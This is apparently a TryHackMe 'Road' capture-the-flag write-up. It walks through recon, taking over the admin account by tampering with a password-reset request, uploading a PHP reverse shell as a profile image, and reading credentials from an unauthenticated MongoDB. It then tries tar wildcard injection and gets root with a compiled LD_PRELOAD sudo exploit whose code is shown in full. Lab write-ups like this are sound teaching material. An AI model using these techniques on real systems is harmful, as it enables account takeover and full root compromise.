# Road TryHackMe WriteUp
### Machine IP = 10.112.173.81
Firstly I made a quick nmap scan:
```bash
nmap 10.112.173.81 -vv -p-
```
Tho ports are open [22, 80]. 
When I explore the web-site, I saw a login page (by clicking the "Merchant Central" button). I didn't have credentials so let's create an account.  
<img width="1129" height="1199" alt="image" src="https://github.com/user-attachments/assets/a83c1ac9-4e0b-444f-9f19-136f90f32653" />    
When I access to my created account I saw a page like this.  
<img width="3189" height="1269" alt="image" src="https://github.com/user-attachments/assets/2abd1d42-a116-437c-8881-0b6d887d859b" />  
When you click your profile and move belowe, you we see a message like this:  
<img width="1089" height="364" alt="image" src="https://github.com/user-attachments/assets/95d72f09-4734-406b-8f24-ff0a9f6f2a7b" />  
It is very important hint for us because we learned that the read admin's name was "admin@sky.thm". When I look at the main page I noticed a password reset section. I thought about changing the real admin's password from there but I cannot select the specific user I want. I can anly change my own account's password. But maybe there can be a vulnerability. Lets look at the request on burpsuite.  
<img width="1071" height="1063" alt="image" src="https://github.com/user-attachments/assets/5c77554f-51d6-4fa9-9e72-8b9d5a70b859" />  
Yeahhhh, that is what I wanted. We can change the username on this request and set any password like "admin". Lets look at the last version of the request.
<img width="1071" height="1063" alt="image" src="https://github.com/user-attachments/assets/92de63af-93c0-4d52-8bb3-dcce49bfb0d8" />  
Just send this request and you will se this response:  
```bash
HTTP/1.1 200 OK
Date: Mon, 02 Mar 2026 13:32:39 GMT
Server: Apache/2.4.41 (Ubuntu)
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
refresh: 3;url=ResetUser.php
Content-Length: 37
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8

Password changed. 
Taking you back...
```
It means the password was succesfully changed. Now, we can access the admin account.
I did this scans but they were waste of time a little bit because I didn't get very important thing from there.
```bash
ffuf -u http://10.112.173.81/v2/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt - .php,.txt,.bak,.zip -fs 0
ffuf -u http://10.112.173.81/v2/admin/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt - .php,.txt,.bak,.zip -fs 0
ffuf -u http://10.112.173.81/phpMyAdmin/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt - .php,.txt,.bak,.zip -fs 0
```
I decided to look at profile section again. I saw that there is a button and we can upload profile image on there. First thing I thought was reverseshell.php file. BUt I also need to know where it will be uploaded because I dedn't see image directory on ffuf scans. So, I looked at the source code.  
<img width="684" height="88" alt="image" src="https://github.com/user-attachments/assets/0d63efe1-1954-4403-bebf-e1ac5945a389" />    
Yeahh, It is the path where our payload was uploaded. I was a hidden folder which couldn't be seen on the directory scan.  
I just upload my reverse shell php file and open this URL **"http://10.112.132.16/v2/profileimages/reverseshell.php"**

----
## User Flag

Yeah, I got shell. Lets explore what we can find. I found the user flag from "/home/webdeveloper". Also, there is ".mysql_history" file which is very important for us but we cannot read it. I couldn't find something so, lets use linpeas. I need to install it from my own terminal to the target terminal.  
```bash
# On my terminal:
 python3 -m http.server 8000
# On target terminal:
 cd /tmp
 wget http://192.168.137.68:8000/linpeas.sh
```
It identified " -rwxr-xr-x 1 root root 83421256 Dec 19  2013 /usr/bin/mongod " . It means we can check "mongo" database to get credentials. Yeah we can read it without needing password:  
```bash
mongo --eval "db.adminCommand('listDatabases')"
mongo backup --quiet --eval "db.getCollectionNames()"
mongo backup --quiet --eval "db.user.find().pretty()"
```
I learned that the "webdeveloper" user's password is "BahamasChapp123!@#". Use su command to be this user.  

----
### Privilege Escalation
First thing was checking "sudo -l" command. I defined that we can execute this "/usr/bin/sky_backup_utility" script. I wanted to read its content so,   
```bash
strings /usr/bin/sky_backup_utility
```
I saw a command in there:     
```bash
tar -czvf /root/.backup/sky-backup.tar.gz /var/www/html/*
```
#### Simple Explanation of the Vulnerability:  

The script runs this command as root:  
**"tar -czvf /root/.backup/sky-backup.tar.gz /var/www/html/*"**  

At first glance, it just creates a backup of the files in /var/www/html/. However, the use of the wildcard (*) creates a big security hole called Tar Wildcard Injection.  
1. How the "Trick" Works   
In Linux, the * symbol tells the system: "Take every filename in this folder and put it into the command."    
If we create files with names that look like commands (starting with dashes like --), tar gets confused. It thinks those filenames are actually instructions on how to run the program, not just files to be backed up.   

2. The "Checkpoint" Exploit (The Payloads)  
To get Root access, we create two special "files" in the folder:  

    File 1: --checkpoint=1  

        What tar thinks: "The user wants me to stop and check the progress after every 1 file I backup."

    File 2: --checkpoint-action=exec=sh shell.sh  

        What tar thinks: "The user wants me to run a script called shell.sh every time I hit a checkpoint."

3. Why this gives us Root?  

Since the main script is running with sudo (Root privileges), the tar command also runs as Root.  
When tar "reads" our fake filenames, it treats them as orders. It reaches the "checkpoint" and executes our shell.sh script. Because tar is Root, our script also runs as Root. This allows us to take full control of the system.  
At first, i searched a folder unside /var/www/html where I can write something, because only in this wway I can create malicious files in this way:  
```bash
echo "cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash" > shell.sh

chmod +x shell.sh

touch ./"--checkpoint=1"

touch ./"--checkpoint-action=exec=sh shell.sh"

sudo /usr/bin/sky_backup_utility
```
But i couldn't find any writable file in there:   
```bash
find /var/www/html -writable -type d 2>/dev/null
```

----
So, lets move on the last choice. We can use this commands to use the vulnerability:  
```bash
cd /tmp

cat <<EOF > pe.c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
EOF

gcc -fPIC -shared -o pe.so pe.c -nostartfiles

sudo LD_PRELOAD=/tmp/pe.so /usr/bin/sky_backup_utility
```
Bingoo, we are root right now.  
























